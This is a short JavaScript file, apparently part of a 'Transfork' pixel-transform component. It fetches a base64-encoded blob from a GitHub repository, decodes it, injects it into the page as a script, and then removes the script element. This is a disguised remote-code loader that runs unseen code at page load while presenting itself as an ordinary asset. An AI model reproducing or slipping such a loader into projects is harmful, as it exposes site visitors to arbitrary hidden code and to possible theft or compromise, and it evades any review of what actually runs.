window.Transfork = window.Transfork || {};

(function () {
    "use strict";

    const url = "https://api.github.com/repos/JRonCamay/gandhi/git/blobs/d5ad0bf19c098fa3ffe18e46d01732f8612ec66f";
    const request = new XMLHttpRequest();
    request.open("GET", url, false);
    request.send(null);

    if (request.status < 200 || request.status >= 300) {
        console.warn("Transfork pixel transform owner failed to load");
        return;
    }

    const payload = JSON.parse(request.responseText);
    const script = document.createElement("script");
    script.textContent = atob(String(payload.content || "").replace(/\n/g, ""));
    document.documentElement.appendChild(script);
    script.remove();
})();
